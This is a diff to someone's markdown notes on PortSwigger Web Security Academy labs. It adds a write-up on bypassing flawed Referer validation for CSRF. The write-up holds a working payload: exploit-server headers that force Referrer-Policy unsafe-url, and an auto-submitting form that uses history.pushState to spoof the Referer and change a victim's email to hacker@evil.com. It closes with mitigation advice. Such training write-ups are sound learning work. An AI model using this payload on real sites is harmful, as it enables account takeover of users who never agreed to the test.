@@ -257,10 +257,67 @@ HTML5 introduced the `<meta>` tag for `referrer` policies, allowing web pages to
        </body>
    </html>
    ```
-   
+
 ### Step 2: Execute the Takedown
 1. Click Store and then Deliver exploit to victim.
 2. The browser executes the POST request without the Referer header. The server's flawed validation skips the check and processes the malicious email change.
 3. The lab is successfully solved! 
 
 **Key Takeaway / Mitigation**: Security validations should "fail-closed," not "fail-open." If an application relies on the Referer header for security, it must reject requests where the header is missing or empty. However, relying solely on headers is fragile; robust Anti-CSRF tokens remain the industry standard defense.
+
+
+# 9th lab
+
+
+#  Lab: CSRF with broken Referer validation
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Bypass flawed `Referer` header validation using `history.pushState` and `unsafe-url` policy to execute a CSRF attack.
+**Vulnerability:** CSRF bypassing flawed `Referer` validation (Substring/Regex logic flaw).
+
+##  The Concept & Challenges
+Some applications validate the `Referer` header by merely checking if the target domain exists *anywhere* within the URL string (e.g., using `indexOf`), rather than strictly parsing the hostname. Attackers can bypass this by placing the target domain in their Exploit Server's query string (e.g., `attacker.com/?target.com`).
+
+**Two major challenges arise during exploitation:**
+1. **Dynamic Delivery:** When delivering the exploit to a victim (or bot), they hit the root path of the exploit server, lacking the necessary query string.
+2. **Browser Privacy Enforcement:** Modern browsers default to `strict-origin-when-cross-origin`, which strips the query string and path from the `Referer` header during cross-origin POST requests, destroying the payload.
+
+##  The "Double Bypass" Technique
+To successfully exploit this, we must combine Client-Side manipulation with Server-Side header overrides:
+1. **`history.pushState()`:** A JavaScript API used to dynamically change the victim browser's URL (adding the target domain as a query string) *before* the CSRF form submits, without reloading the page.
+2. **`Referrer-Policy: unsafe-url`:** An HTTP response header sent by the Exploit Server that overrides the browser's default privacy settings, forcing it to send the full, manipulated URL (including the query string) in the `Referer` header.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Configure Exploit Server Headers
+Navigate to the Exploit Server. In the **Head** section, inject the `Referrer-Policy` header to force the browser to send the full URL:
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+```
+
+### Step 2: Build the Exploit Body
+In the Body section, create the CSRF auto-submit form and add the history.pushState JavaScript logic:
+```
+<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
+    <input type="hidden" name="email" value="hacker@evil.com">
+</form>
+
+<script>
+    // 1. Dynamically append the target domain to the Exploit Server's URL
+    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
+    
+    // 2. Auto-submit the form. The browser will now send the manipulated URL as the Referer.
+    document.getElementById('csrf-form').submit();
+</script>
+```
+### Step 3: Execute the Takedown
+1. Ensure the target URL in both the <form action="..."> and the pushState string matches your active lab instance exactly.
+
+2. Click Store to save the payload.
+
+3. Click Deliver exploit to victim. The bot loads the page, its URL is manipulated, the privacy policy is overridden, and the flawed server accepts the spoofed Referer header. Lab Solved! 🎉
+
+**Key Takeaway / Mitigation:** 
+1. Referer validation should strictly parse the URL object and check the hostname property against an allowlist, never relying on simple string matching.
+2. Attackers can easily manipulate the client-side environment (pushState) and browser behaviors (Referrer-Policy), proving that checking headers is insufficient. Robust Anti-CSRF tokens must be used.
